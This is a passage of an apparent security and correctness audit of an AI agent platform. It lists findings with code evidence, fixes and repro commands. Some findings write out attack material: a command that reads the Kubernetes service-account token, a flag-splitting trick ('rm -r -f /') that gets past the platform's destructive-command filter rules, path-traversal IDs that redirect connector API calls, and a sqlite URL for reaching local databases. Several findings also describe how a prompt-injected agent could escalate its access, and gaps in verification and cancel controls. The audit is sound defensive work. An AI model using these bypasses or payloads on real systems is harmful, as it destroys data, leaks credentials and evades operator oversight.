import os,tempfile; os.environ['MAVERICK_HOME']=tempfile.mkdtemp(); os.environ['MAVERICK_ENCRYPT_AT_REST']='0'
from maverick_dashboard import settings_store as ss
for s in ss.SWITCHABLE_SECTIONS:
    ss.set_section_enable(s, True); print(s, s in ss.load_overlay())
EOF
# fleet_memory False, entity_graph False. Or POST /api/v1/features/switches {"section":"fleet_memory","enabled":true} in auth-off TestClient -> 409.

#### W3-1 — 29 tenant suite APIs return 401 for static-bearer and local auth-off callers while sibling suites accept them (principal-derivation divergence)

- **Severity:** high · **Status:** Raised (finder cited evidence; skeptic pass not run) · **Category:** correctness · **Effort:** M · **Found by:** dashboard-suite-apis
- **Where:** `packages/maverick-dashboard/maverick_dashboard/third_party_lifecycle_api.py:266`
- **Evidence:**

  ```
  def _principal(request: Request, tenant_id: str) -> str:
      verified = getattr(request.state, "principal", None)
      subject = getattr(verified, "principal", None) or getattr(verified, "sub", None)
      if not isinstance(subject, str) or not subject:
          raise HTTPException(
              status_code=401,
              detail="an authenticated principal is required for third-party lifecycle",
  ```
- **Why it matters:** auth.py's require_principal returns None (request.state.principal unset) for a valid MAVERICK_DASHBOARD_TOKEN bearer and in auth-off local mode. 29 suite API modules (grep 'an authenticated principal is required') copy a _principal helper that 401s in exactly those cases, so the documented static-token API path and single-user local mode cannot use third-party lifecycle, privacy notices, compliance scoping, consent bulk jobs, TRC evidence, unified audit, agent control plane, etc. Meanwhile privacy_regulatory_intelligence_api.py:247 and third_party_intelligence_api.py:404 default the subject to "local-operator", no_code_grc_studio_api/third_party_contracts_api fall back to anonymous_local_access_allowed, and core routes work. Live probe (scratch probe.py): with a valid static bearer + MAVERICK_TENANT, GET /api/v1/third-party/lifecycle/status, /privacy/notices/status, /compliance/scoping/status -> 401; /third-party/intelligence/status, /consent/custom-indexes/status, /goals -> 200; identical results in auth-off mode. The matching *_page.py routers only require_permission('view'), so the workbench pages render and then every fetch fails with 401 — a broken-page experience. If a named principal is a deliberate governance requirement it is enforced inconsistently (2 siblings silently accept), undocumented outside docs/vendor-onboarding.md, and the pages should refuse to render.
- **Recommendation:** Decide the contract once: either (a) accept static-bearer/local callers as a stable synthetic operator principal (as third_party_intelligence_api does) or (b) require a named principal everywhere and make the paired page routers return the same 401/409 with guidance. Implement it in ONE shared helper (e.g. _shared.principal_ref(request, tenant_id, namespace)) and replace the 22 _principal + 14 _principal_ref copies. Add a parametrized test that hits every suite's /status route under static-bearer and auth-off modes and asserts one consistent outcome.
- **How to confirm:** MAVERICK_HOME=/tmp/x MAVERICK_TENANT=t MAVERICK_DASHBOARD_TOKEN=abc python3 -c 'from fastapi.testclient import TestClient; from maverick_dashboard.app import app; c=TestClient(app,headers={"Authorization":"Bearer abc","Origin":"http://testserver"}); print(c.get("/api/v1/third-party/lifecycle/status").status_code, c.get("/api/v1/third-party/intelligence/status").status_code)'  -> 401 200. Also: grep -l 'an authenticated principal is required' packages/maverick-dashboard/maverick_dashboard/*_api.py | wc -l -> 29.

#### W5-27 — One-command demo prints a ?token= URL that the dashboard rejects with 401

- **Severity:** high · **Status:** Confirmed (hand spot-check at close-out) · **Category:** correctness · **Effort:** S · **Found by:** deploy-infra
- **Where:** `deploy/demo/run-demo.sh:50`
- **Evidence:**

  ```
  URL="http://localhost:${PORT}/?token=${TOKEN}"
  printf 'Waiting for the dashboard to come up'
  ...
  echo "Lightwork demo is live:"
  echo "  $URL"
  ```
- **Why it matters:** The sales/demo path (deploy/demo/README.md lines 12, 28, 45, 57, 65 all instruct `https://host/?token=<TOKEN>`) relies on query-string auth that app.py:1932 explicitly removed ("``?token=`` query auth was removed ... Require the ``Authorization: Bearer`` header"). Verified live: a dashboard started with MAVERICK_DASHBOARD_TOKEN answered 401 to `/?token=<tok>` from both 127.0.0.1 and a non-loopback address, and 303 with the Bearer header. run-demo.sh therefore opens the browser onto a 401 page and README Models 1-3 hand prospects a dead link; deploy/demo/fly.toml:10-12 and render.yaml:9-11 already say the opposite ("the dashboard no longer accepts ?token="), so the directory contradicts itself.
- **Recommendation:** Update run-demo.sh to print the plain URL plus the token and instructions (Bearer header / OIDC or invite flow), and rewrite deploy/demo/README.md lines 10-12, 27-30, 45-47, 54-65 to match fly.toml/render.yaml. Better: add a minimal browser login form (or a cookie exchange endpoint) so a demo audience can use a link at all; the demo-cluster nginx-inject pattern is the current workaround.
- **Spot-check:** Hand re-read: run-demo.sh prints http://localhost:PORT/?token=...; app.py:1932 documents that `?token=` query auth was removed because it leaks the bearer.
- **How to confirm:** MAVERICK_HOME=/tmp/x MAVERICK_DASHBOARD_TOKEN=t maverick dashboard --host 0.0.0.0 --port 8799 & curl -s -o /dev/null -w '%{http_code}' 'http://127.0.0.1:8799/?token=t'  # -> 401 ; grep -n 'query auth was removed' packages/maverick-dashboard/maverick_dashboard/app.py

#### W5-29 — ECS circuit-breaker 'rollback' cannot roll back: image tag is mutable :latest and ECR expires the previous image

- **Severity:** high · **Status:** Raised (finder cited evidence; skeptic pass not run) · **Category:** reliability · **Effort:** M · **Found by:** deploy-infra
- **Where:** `deploy/aws/terraform/ecs.tf:141`
- **Evidence:**

  ```
  # short gap while the old task stops and the new one passes health checks;
  # the circuit breaker restores the previous task definition if the new one
  # fails to start.
    deployment_minimum_healthy_percent = 0
    deployment_maximum_percent         = 100
  ```
- **Why it matters:** ecs.tf:27 runs `${repository_url}:${var.image_tag}` with image_tag defaulting to "latest" (variables.tf:164-168) in a MUTABLE repo (ecr.tf:3). The documented deploy path (NEXT_STEPS.md step 5) is `update-service --force-new-deployment` with the SAME task definition, so there is no 'previous task definition' to restore, and even when a new revision exists it points at the same :latest tag that was just overwritten. A rollback re-pulls the broken image. ecr.tf:19-25 then expires the now-untagged previous image after 7 days, so a manual rollback to the prior build is impossible after a week. With min-healthy 0%, a bad push is a full outage that the circuit breaker cannot heal.
- **Recommendation:** Make CodeBuild tag images by git SHA (IMAGE_TAG=sha-<commit>), set image_tag_mutability = "IMMUTABLE", pass the SHA tag into the task definition on each apply (or use the image digest), keep a count-based ECR lifecycle rule (e.g. keep last 10 tagged), and update the ecs.tf comment/NEXT_STEPS.md deploy procedure accordingly.
- **How to confirm:** grep -n 'image_tag\|latest' deploy/aws/terraform/variables.tf deploy/aws/terraform/ecs.tf deploy/aws/terraform/codebuild.tf; grep -n MUTABLE deploy/aws/terraform/ecr.tf; sed -n 139,146p deploy/aws/terraform/NEXT_STEPS.md

#### W5-28 — Production RDS has deletion_protection=false and skip_final_snapshot=true

- **Severity:** high · **Status:** Confirmed (hand spot-check at close-out) · **Category:** data-integrity · **Effort:** S · **Found by:** deploy-infra
- **Where:** `deploy/aws/terraform/rds.tf:28`
- **Evidence:**

  ```
  backup_retention_period = 7
    deletion_protection     = false
    skip_final_snapshot     = true
    apply_immediately       = true
  ```
- **Why it matters:** This is the prod stack (variables.tf defaults environment="prod", backend key lightwork/prod). Any `terraform destroy`, or a change that forces replacement of aws_db_instance (identifier change via var.project/var.environment, engine major bump, subnet-group change), deletes the world model with no final snapshot and no console guard; the 7-day automated backups are deleted with the instance. The EFS volume next door gets `prevent_destroy = true` (efs.tf:15-17) but the database that holds every goal, message and fact does not. multi_az=false additionally means an AZ event is an outage for the control plane.
- **Recommendation:** Set deletion_protection = true, skip_final_snapshot = false with final_snapshot_identifier, add lifecycle { prevent_destroy = true } to aws_db_instance.main, and consider multi_az = true and copy_tags_to_snapshot = true. Document the one-time override path for intentional teardown.
- **Spot-check:** Hand re-read: deploy/aws/terraform/rds.tf sets deletion_protection = false and skip_final_snapshot = true on the production instance.
- **How to confirm:** sed -n 25,32p deploy/aws/terraform/rds.tf; compare with efs.tf:14-17 which guards the EFS volume.

#### W1-24 — Domain-routed goals (packs / --domain) skip FINAL verification, the review checkpoint and the thinking budget because the root agent's role is the pack name, not 'orchestrator'

- **Severity:** high · **Status:** Raised (finder cited evidence; skeptic pass not run) · **Category:** correctness · **Effort:** S · **Found by:** kernel-agent-loop
- **Where:** `packages/maverick-core/maverick/agent.py:3818`
- **Evidence:**

  ```
  if (
                          self.role == "orchestrator"
                          and self.depth == 0
                          and not getattr(self, "_already_verified", False)
                          and self.ctx.goal_id is not None
                      ):
  ```
- **Why it matters:** orchestrator.py:1503-1504 builds the depth-0 root for any domain run via domain.agent_from_profile, which constructs `Agent(ctx=ctx, role=profile.name, ...)` (domain.py:885-886). Every kernel feature keyed on `role == "orchestrator"` is therefore silently off for the platform's headline path (2,031 specialist packs): the LLM/ensemble verifier (3818), the [safety] review_checkpoint heartbeat (1345), the extended-thinking budget (1718), cache prewarm (3384), and the root receives the WORKER system template ('You are a specialist agent... depth 0'). The result is returned with verifier_confidence=1.0 and no uncertainty note, and downstream consumers (trajectory donation, autonomy servo via last_verifier_confidence, dashboard) treat it as verified. Repro: test_T2_domain_named_root_skips_verifier -- role='finance_controller', depth 0: 1 LLM call, confidence 1.0, worker template in agent.system.
- **Recommendation:** Introduce an explicit `is_root` predicate (depth == 0 and parent is None) and use it instead of `role == "orchestrator"` for verification, review checkpoint, thinking budget, prewarm and template selection (or set a separate `self.kind = 'root'` in agent_from_profile when depth == 0). Add a test that a domain-routed run_goal invokes verify_final.
- **How to confirm:** grep -n 'role == "orchestrator"' packages/maverick-core/maverick/agent.py; grep -n 'role=profile.name' packages/maverick-core/maverick/domain.py; run test_repro.py::test_T2_domain_named_root_skips_verifier.

#### W1-25 — A text-only response without a FINAL: marker is accepted as the final answer with verifier_confidence=1.0, bypassing the verifier, coding-mode apply-check, STOP hooks and the run record

- **Severity:** high · **Status:** Raised (finder cited evidence; skeptic pass not run) · **Category:** correctness · **Effort:** S · **Found by:** kernel-agent-loop
- **Where:** `packages/maverick-core/maverick/agent.py:4176`
- **Evidence:**

  ```
  if not resp.tool_calls:
                  if resp.text:
                      return AgentResult(final=resp.text, role=self.role, name=self.name)
                  return AgentResult(
                      error="empty response with no tools", role=self.role, name=self.name
                  )
  ```
- **Why it matters:** The whole verification/patch-validation/uncertainty-note pipeline (agent.py:3596-4172) only runs when find_final_marker_end() finds a FINAL: outside a code fence. Any model that answers in plain prose (small open-weight models routinely ignore the marker instruction; a FINAL: placed inside a ``` fence is deliberately masked) exits through this branch: no verify_final, no `git apply --check`, no world.append_message, no STOP hook, no `bb.post('finding')`, no _score_step(is_final), and the default verifier_confidence=1.0 is reported to the orchestrator, donation selector and autonomy servo. This is the opposite of the intended posture where the verifier is the quality gate on the orchestrator's answer. Repro: test_T1_plain_text_without_FINAL_bypasses_verifier (1 LLM call, confidence 1.0) vs test_T1b (FINAL: marker -> 2 calls).
- **Recommendation:** Route the no-tool-call text branch through the same FINAL handling: treat a text-only end_turn response as `final = resp.text` (optionally after one nudge 'end with FINAL:') so verification, patch validation, hooks and record writes apply; report verifier_confidence honestly (0.0/'not verified') when verification did not run. Add a loop test where the scripted answer lacks the marker and assert verify_final is invoked.
- **How to confirm:** run test_repro.py::test_T1_plain_text_without_FINAL_bypasses_verifier; compare LLM call counts with and without the FINAL: prefix.

#### W1-23 — Dashboard 'Cancel' never stops a running goal: the agent loop never reads goal status, contrary to the endpoint docstring

- **Severity:** high · **Status:** Raised (finder cited evidence; skeptic pass not run) · **Category:** correctness · **Effort:** S · **Found by:** kernel-agent-loop
- **Where:** `packages/maverick-dashboard/maverick_dashboard/api.py:9090`
- **Evidence:**

  ```
  """Mark a goal as cancelled.
  
      The agent loop checks status at each tool-call boundary; setting
      'cancelled' here causes the next check to short-circuit the run.
      Already-done goals are a no-op.
      """
  ```
- **Why it matters:** The claim is false: `grep -n "get_goal\|\.status" packages/maverick-core/maverick/agent.py` returns nothing, and the only status check is orchestrator.py:1569 which runs AFTER root.run() returns. A user pressing Cancel on the dashboard (or POST /goals/{id}/cancel from the API) leaves the swarm executing LLM calls, tools and spawns until FINAL, max_steps or the budget cap -- continuing to spend money and take side effects after the operator asked it to stop. Only the global killswitch (HALT file / halt table) stops a run, and that halts every goal, not this one. Repro: scratch test test_T5_dashboard_cancel_not_honoured_midrun sets status='cancelled' during the first LLM call and the loop still makes 3 LLM calls and returns final='done'.
- **Recommendation:** Add a goal-scoped stop check to the turn-boundary gate in Agent._run_inner (next to killswitch.check()/budget.check() at agent.py:3441-3450) and to the per-tool halt check at agent.py:4310, throttled like _mirror_live_spend (read world.get_goal(goal_id).status every ~1-5s) and returning AgentResult(error='cancelled'); or have cancel_goal arm a per-goal entry in the killswitch halt table that killswitch.check() consults with a goal_id scope. Fix the docstring either way and add a test that cancels mid-run and asserts no further LLM calls.
- **How to confirm:** grep -n 'get_goal\|cancelled' packages/maverick-core/maverick/agent.py (no hits); run scratchpad/audit/work/kernel-agent-loop/test_repro.py::test_T5_dashboard_cancel_not_honoured_midrun (passes = bug present).

#### W5-2 — Release tags are mutable (no tag ruleset): v0.1.6 was re-pointed three times and keyless signatures bind only to the tag name

- **Severity:** high · **Status:** Raised (finder cited evidence; skeptic pass not run) · **Category:** supply-chain · **Effort:** S · **Found by:** ci-supply-chain
- **Where:** `deploy/verify-release.sh:47`
- **Evidence:**

  ```
  IDENTITY_REGEXP="^https://github.com/([Dd]aybreak-[Aa][Ii]-[Ll]abs/[Ll]ightwork|[Dd]ay-[Aa][Ii]-[Ll]abs/([Ll]ightwork|[Mm]averick))/\.github/workflows/release\.yml@refs/tags/${ESCAPED_TAG}$"
  ```
- **Why it matters:** The only ruleset targets `~DEFAULT_BRANCH` (protect-main.json:3-9); nothing protects refs/tags/v*. The Release workflow history shows three runs on head_branch v0.1.6 with three different SHAs on 2026-06-02 (1e1f156, 47b4afb, 86760df), i.e. the tag was force-moved after signing artifacts; the remote also carries a malformed `v.0.1.2` tag and v0.1.0/v0.1.1 pointing at the same commit. The Sigstore identity that customers verify (verify-release.sh:47; release.yml container promotion identity `release.yml@refs/tags/${RELEASE_TAG}`) contains only the tag NAME, so artifacts built from any commit the tag was ever pointed at verify identically. 'Immutable release' and 'older signed artifacts cannot be replayed as a different release' (verify-release.sh:17-19) are therefore not guaranteed by the repo configuration. GitHub Releases are also not marked immutable.
- **Recommendation:** Add a second ruleset file (e.g. .github/rulesets/protect-release-tags.json, target 'tag', include refs/tags/v* and native-v*/desktop-v*) with deletion, non_fast_forward and update restrictions, import it, and extend test_the_ruleset_requires_every_blocking_check_and_the_queue to assert it exists. Enable GitHub's immutable-releases repository setting. Consider embedding the source SHA in verification (e.g. verify-release.sh also checks the certificate's source-repository-digest extension against the release's maverick-container-*.json source_revision).
- **How to confirm:** `git ls-remote --tags origin` shows v.0.1.2 and v0.1.0/v0.1.1 -> 430a534; `gh api 'repos/Daybreak-AI-Labs/Lightwork/actions/workflows/release.yml/runs'` lists runs 19, 20, 21 all with head_branch v0.1.6 and different head_sha. `gh api repos/.../rulesets` shows no tag-targeted ruleset.

#### W5-1 — Committed branch ruleset is not what the live repo enforces: PRs merge before required checks finish and the merge queue has never run

- **Severity:** high · **Status:** Raised (finder cited evidence; skeptic pass not run) · **Category:** compliance · **Effort:** S · **Found by:** ci-supply-chain
- **Where:** `.github/rulesets/protect-main.json:4`
- **Evidence:**

  ```
  "target": "branch",
    "enforcement": "active",
    "bypass_actors": [],
  ```
- **Why it matters:** docs/CONTRIBUTING.md:97-101 tells contributors and auditors that every change 'lands through a pull request, through the merge queue, as a squash, and only once every required check below has passed on the queue's merge'. The live repository contradicts this: (1) the GitHub API reports zero workflow runs with event=merge_group for ci.yml and commit-hygiene.yml in the repo's entire history (2,156 CI runs), so the merge_queue rule is not active; (2) PR #2449 was merged by its author at 2026-09-05T21:55:17Z while required checks test (3.10, 1|2|3) were still running (they completed 21:58:06, 21:59:02 and 22:03:26); (3) the resulting main commit 173ceef carries 'Co-authored-by: Claude <noreply@anthropic.com>' and the no-ai-attribution push run (#180) went red on main, as did run #156 (b9dee62) and #169 (945d261); (4) main commit 945d261 (#2448) landed with CI run 5341 failing (24/24 jobs). The ISO 27001 SoA (docs/compliance/iso-27001/statement-of-applicability.md:134) and the SOC 2 CC8 mapping cite 'CI gates + PR review' as implemented change control; the evidence shows the gates are advisory. The JSON file is only ever applied by a manual 'Import a ruleset' step and nothing detects drift.
- **Recommendation:** Re-import .github/rulesets/protect-main.json in Settings > Rules > Rulesets (or fix whatever bypass/disabled state exists), then add a scheduled workflow (e.g. weekly, plus on changes to the JSON) that runs `gh api repos/$GITHUB_REPOSITORY/rulesets` + `/rulesets/{id}` with a read-only token and diffs the live rule set against the committed file, failing (and opening an issue) on drift. Also fix the 'required check passes in 4s on PR' pattern only after the queue is actually enforced, otherwise `test (3.11, n)`/`posture (n)` are green stubs on every PR with nothing ever running them before merge.
- **How to confirm:** GitHub API: `gh api 'repos/Daybreak-AI-Labs/Lightwork/actions/workflows/ci.yml/runs?event=merge_group'` returns total_count 0. `gh pr view 2449 --json mergedAt` = 2026-09-05T21:55:17Z while `gh api repos/.../commits/bea3e36e.../check-runs` shows 'test (3.10, 3)' completed_at 2026-09-05T22:03:26Z. `gh api repos/.../rulesets` will show the live state directly.

#### W1-85 — Kubernetes sandbox pod mounts the namespace ServiceAccount token (no automountServiceAccountToken:false, no seccomp, no read-only rootfs)

- **Severity:** high · **Status:** Raised (finder cited evidence; skeptic pass not run) · **Category:** security · **Effort:** S · **Found by:** sandbox-isolation
- **Where:** `packages/maverick-core/maverick/sandbox/kubernetes.py:110`
- **Evidence:**

  ```
  return {
              "spec": {
                  "securityContext": {
                      "runAsNonRoot": True,
                      "runAsUser": int(self.run_as_user),
                  },
                  "containers": [container],
  ```
- **Why it matters:** The backend refuses to run at all unless allow_network=true (exec returns exit 2 otherwise, kubernetes.py:165-187), so every functioning kubernetes sandbox has network access. Kubernetes automounts the namespace default ServiceAccount token into every pod unless the spec sets automountServiceAccountToken: false; nothing in _pod_overrides does. A prompt-injected agent can `cat /var/run/secrets/kubernetes.io/serviceaccount/token` and use it with the in-cluster API (KUBERNETES_SERVICE_HOST is injected) — a cluster credential leaked into the very boundary that is supposed to contain model-driven shell. The override also omits seccompProfile RuntimeDefault and readOnlyRootFilesystem that the other backends' hardening claims imply. Path is live in the only working configuration of this backend.
- **Recommendation:** In _pod_overrides add "automountServiceAccountToken": False and "enableServiceLinks": False at spec level, "seccompProfile": {"type": "RuntimeDefault"} in the pod securityContext, and "readOnlyRootFilesystem": True plus an emptyDir at /tmp in the container. Add a unit test asserting these keys appear in the --overrides JSON.
- **How to confirm:** python3 -c "from maverick.sandbox.kubernetes import KubernetesBackend as K; import json; K._verify_kubectl=lambda s:None; print(json.dumps(K(allow_network=True)._pod_overrides('p')))" — output contains no automountServiceAccountToken / seccompProfile / readOnlyRootFilesystem.

#### W1-86 — Kubernetes backend never transfers the workspace into the pod despite its docstring (emptyDir + kubectl cp) — commands run against an empty directory

- **Severity:** high · **Status:** Raised (finder cited evidence; skeptic pass not run) · **Category:** correctness · **Effort:** M · **Found by:** sandbox-isolation
- **Where:** `packages/maverick-core/maverick/sandbox/kubernetes.py:4`
- **Evidence:**

  ```
  Spawns a transient ``kubectl run --rm -i --restart=Never`` pod per
  ``exec()`` call, mounts the workspace via an emptyDir + ``kubectl
  cp`` (or, when ``workdir`` is None, runs without a mount), captures
  stdout/stderr/exit-code, and deletes the pod on exit.
  ```
- **Why it matters:** exec() (lines 160-230) builds `mkdir -p <workdir> && cd <workdir> && <cmd>` and runs `kubectl run` — there is no `kubectl cp`, no volume, no emptyDir anywhere in the module (grep confirms). The agent's `pytest`/`grep`/`git diff` therefore run in an empty /workspaces/repo inside the pod while the in-process file tools (read_file/write_file, fs.py:28) operate on the HOST path Path('/workspaces/repo'). The same class of defect was flagged for Firecracker (ADVERSARY_COUNCIL #18, CODE_QUALITY firecracker.py:189) and README/FEATURES now caveat Firecracker as a scaffold — but Kubernetes is listed as a shipped backend (README.md:63, FEATURES.md:2526-2529) with no caveat, and the wizard offers it (wizard.py:5151). A customer selecting it gets confidently-wrong test results.
- **Recommendation:** Either implement the transfer (create the pod with `sleep`, `kubectl cp <workdir> pod:/workspaces/repo`, `kubectl exec`, `kubectl cp` back for mutated files) or make exec() fail closed with an explicit 'workspace not mounted' error and label the backend experimental in README/FEATURES/wizard, as was done for Firecracker. Add a test asserting the workspace contents are visible to the pod command (fake kubectl).
- **How to confirm:** grep -n 'kubectl cp\|emptyDir\|-v \|volume' packages/maverick-core/maverick/sandbox/kubernetes.py returns only the docstring line; exec() args at lines 178-186 contain no mount.

#### W2-33 — Advertised rm -rf / and recursive chmod/chown rules bypassed by splitting the flags

- **Severity:** high · **Status:** Confirmed (hand spot-check at close-out) · **Category:** security · **Effort:** M · **Found by:** shield-safety
- **Where:** `packages/maverick-shield/maverick_shield/builtin_rules.py:293`
- **Evidence:**

  ```
  Rule("rm_rf_root", "critical", _compile(r"\brm\s+-[a-z]*(?:rf|fr)[a-z]*\s+(\/|~|\$HOME)(\*|\/|[\s;&|]|$)"), ...)
  ... Rule("recursive_chmod_chown_root", "critical", _compile(r"\bch(mod|own)\s+-[a-z]*R[a-z]*\s+..."))
  ```
- **Why it matters:** Both rules require the flags in ONE contiguous token (`-rf`, `-...R...`). Separating the flags — `rm -r -f /`, `chmod -c -R 777 /` — is functionally identical but the first flag token contains neither `rf/fr` nor `R`, so the rule never fires. Verified through the full Shield.scan_input (builtin backend, the shipped backend): `rm -r -f /` -> PASS/none. ARCHITECTURE.md:66 explicitly advertises `rm -rf /` coverage to buyers, and the rule severity is 'critical', so this is a bypass of an advertised control. The shell_deobfuscate candidate collapses 2+ spaces and strips quotes but does not merge separate flag tokens.
- **Recommendation:** Rewrite rm_rf_root to tolerate multiple flag groups, e.g. match `rm(\s+-[a-z]+)*` where the union of flag chars includes both r and f, then a root target; same for chmod/chown -R. Add corpus cases `rm -r -f /`, `rm -f -r /`, `chmod -c -R / `. Better: route destructive-shell detection through a small argv tokenizer rather than surface regex.
- **Spot-check:** Hand re-read: rm_rf_root is `\brm\s+-[a-z]*(?:rf|fr)[a-z]*\s+(/|~|$HOME)` so `rm -r -f /` never matches; recursive_chmod_chown_root likewise requires a single -R token.
- **How to confirm:** python3 -c "from maverick_shield import Shield; print(Shield(profile='balanced').scan_input('rm -r -f /').allowed)" prints True (allowed).

#### W1-110 — Hand-written connectors interpolate unencoded model-supplied IDs into API paths; dot-segments reach arbitrary endpoints (incl. writes) with the operator's credential

- **Severity:** high · **Status:** Raised (finder cited evidence; skeptic pass not run) · **Category:** security · **Effort:** S · **Found by:** tools-a-f
- **Where:** `packages/maverick-core/maverick/tools/asana_tool.py:203`
- **Evidence:**

  ```
  code, data = _put(f"/tasks/{tgid}", {"data": {"completed": True}})
  ```
- **Why it matters:** httpx normalizes dot-segments before sending, so a model-emitted id like `../../api/1.0/goals/123` rewrites the request target. Verified end-to-end on this box with httpx monkeypatched: asana task_get gid `../workspaces` -> GET /api/1.0/workspaces; asana task_complete -> PUT /api/api/1.0/goals/123; cloudflare dns_delete zone `../accounts/ACC/members` -> DELETE /client/v4/accounts/ACC/members/dns_records/MEMBERID; clickup task_create -> POST /api/api/v2/team/T/goal/task. The same pattern is in bitbucket_tool.py:92 (ws/repo), clickup_tool.py:151/182, cloudflare_tool.py:178/193, confluence_tool.py:131/184 (page_id), dynamics_tool.py:70/94 (entity). A prompt-injected agent thus escalates a narrowly described op (e.g. 'complete a task', 'delete a DNS record') to any GET/POST/PUT/DELETE endpoint the token can reach; confirm=true is still required for writes but the confirm prompt describes the wrong resource. calendly_tool.py:135 (_safe_uuid) and elasticsearch_tool.py:108 (_seg) already guard exactly this in sibling modules, so this is copy-paste divergence. cloudflare/confluence/bitbucket/dynamics are registered by default (deferred); asana/clickup need MAVERICK_ENABLE_CRED_TOOLS.
- **Recommendation:** Add a shared `_path_segment(value)` helper in tools/__init__.py (urllib.parse.quote(value, safe='') plus a reject of '.', '..' and empty) and apply it to every interpolated id/slug/entity in asana, bitbucket, clickup, cloudflare, confluence, dynamics (and any g-z sibling with the same shape); add a regression test that `../` in each id yields ERROR rather than a request.
- **How to confirm:** python3 -c "import httpx;print(httpx.Request('GET','https://app.asana.com/api/1.0/tasks/../workspaces').url.raw_path)" prints b'/api/1.0/workspaces'; then monkeypatch httpx.get/put in a scratch script, set ASANA_TOKEN, call asana_tool().fn({'op':'task_complete','task_gid':'../../api/1.0/goals/1','confirm':True}) and inspect the captured URL.

#### W1-111 — `database` tool accepts a model-supplied SQLAlchemy `url` with no scheme/host policy by default, so an agent can open any local SQLite file or any reachable DB server

- **Severity:** high · **Status:** Raised (finder cited evidence; skeptic pass not run) · **Category:** security · **Effort:** S · **Found by:** tools-a-f
- **Where:** `packages/maverick-core/maverick/tools/database_tool.py:168`
- **Evidence:**

  ```
  url = (url or os.environ.get("DATABASE_URL", "")).strip()
      if not url:
          return "ERROR: database requires a SQLAlchemy URL via the url arg or DATABASE_URL."
      denial = _host_denial(url, allow_hosts)
  ```
- **Why it matters:** The schema (line 51) advertises `url` as a model input and the default registry registers the tool unconditionally (tools/__init__.py:1243). `_host_denial` returns None whenever no capability allow_hosts is set (lines 134-135), which is the default. With sqlalchemy installed (a documented extra, not core) an agent can run `sqlite:////home/<user>/.maverick/world.db` and read (SELECT runs without confirm) or, with confirm=true, mutate Lightwork's own world model / audit tables, bypassing the workspace confinement that read_file/write_file enforce; it can equally point at any internal Postgres/MySQL reachable from the host (SSRF-to-DB with credentials embedded in the URL). Enterprise egress_guard patches httpx, not DB drivers.
- **Recommendation:** Default-deny model-supplied `url`: only honor it when a capability allow_hosts is present or an explicit `[tools] database_allow_url_arg = true` knob is set; reject `sqlite:` URLs (or confine file paths to sandbox.workdir); log the effective host on every call. Add wizard/config knob per kernel rule 5.
- **How to confirm:** pip install sqlalchemy in a scratch venv, then database_tool().fn({'op':'query','sql':'select name from sqlite_master','url':'sqlite:////home/user/.maverick/world.db'}) returns table names with no confirm and no denial; tests/test_database_tool.py only asserts denial when _capability_allow_hosts is supplied.

## Quick wins (medium or worse, under a day each)

| ID | Sev | Area | Location | Finding | Fix |
|---|---|---|---|---|---|
| W2-90 | high | core/air_gap | `packages/maverick-core/maverick/air_gap.py:88` | `maverick airgap check` can report 'clean' while the process-wide egress guard is off: it checks [egress] deny=['*'] (enforced by ~15 modules) but never [enterprise] mode, which is what egress_guard actually enforces | Add a violation when enterprise mode is not on for the audited config (config['enterprise']['mode'] is not True and MAVERICK_ENTERPRISE not truthy and no compliance floor requiring FLOOR_EGRESS_LOCK), and when [enterprise] allowed_hosts is non-empty; alternatively make egress_guard._denied also apply tenant.egress.host_allowed so [egress] deny=['*'] is enforced at the seam. Update test_air_gap.py fixtures accordingly. |
| W4-59 | high | core/assessment | `packages/maverick-core/maverick/assessment.py:4996` | assessment.list_saved() crashes once the sibling assessments.py register exists in the same data directory | Give assessments.py its own subdirectory (e.g. data_dir("assessment_register")) or reserve the stems 'register' and 'templates' in assessment.py's glob (skip them explicitly). Additionally make list_saved() skip-and-log a record whose id does not match its filename instead of raising, so one foreign/corrupt file cannot take down every listing endpoint. Add a regression test that writes register.json and templates.json into the shared dir and asserts list_saved() still works. |
| W1-45 | high | core/backup | `packages/maverick-core/maverick/backup.py:664` | DR backup archive bundles the at-rest encryption key next to the sealed world.db | Exclude `keys/` (at_rest.key, at_rest.d/, audit signing keys) from _excluded_from_snapshot() by default and add an explicit `--include-keys` flag that prints a loud warning; better, seal the whole payload (or the manifest-listed sensitive files) under a backup-specific key derived from MAVERICK_BACKUP_SIGNING_KEY so the archive is confidential as well as authenticated. Document that key escrow is a separate step and add a test asserting no *.key member appears in a default archive. |
| W2-2 | high | core/coding | `packages/maverick-core/maverick/reviewer.py:159` | render_diff / get_diff leak the full host environment (provider API keys) into git subprocesses | Pass `env=scrub_env()` (or scrub_child_env()) to every host git subprocess in reviewer.py and edit_format.py, matching tools/git_advanced.py and tools/preview_diff.py which already scrub. Set GIT_PAGER="" and GIT_CONFIG_GLOBAL/SYSTEM=os.devnull as those helpers do. |
| W4-1 | high | core/consent_preferences | `packages/maverick-core/maverick/consent_preferences.py:3721` | unified_audit_records raises permanently for any tenant that has unlinked a profile (Operating Record capture breaks) | Add "profile.unlinked": "relationship_changed" (or a dedicated action) to the actions map in unified_audit_records; add a regression test that links, unlinks, then calls unified_audit_records. Consider making the map a module constant shared with _outbox event_type validation so new outbox event types cannot be added without an audit mapping. |
| W2-32 | high | core/external_agents | `packages/maverick-core/maverick/external_agents.py:1053` | External-agent/federation shield screen never blocks: verdict.blocked read on a ShieldVerdict that has no such attribute | Replace `getattr(verdict, "blocked", False)` with `not getattr(verdict, "allowed", True)` at external_agents.py:291, 1053, 1421 (and audit any other `.blocked` reads). Add a unit test that feeds a known-blocking payload through _sanitize/the action gate and asserts denial. Consider giving ShieldVerdict a `blocked` property alias to make the two spellings equivalent and prevent recurrence. |
| W1-2 | high | core/llm circuit breaker | `packages/maverick-core/maverick/llm.py:1450` | Budget exhaustion and client-side 400s trip the provider circuit breaker, fast-failing every other goal/tenant in the process for 30s | Feed the breaker only with provider-transport outcomes: classify the exception before _feed_circuit and record a failure only for 429/5xx/timeout/connection classes (reuse retry._is_retryable_status_error / failover_policy.classify_error), never for BudgetExceeded, ModelNotAllowedError, PreflightFailed, EgressBlocked or 4xx. Consider keying the breaker by (provider, base_url/tenant) so one tenant's quota problem cannot open another's circuit. |
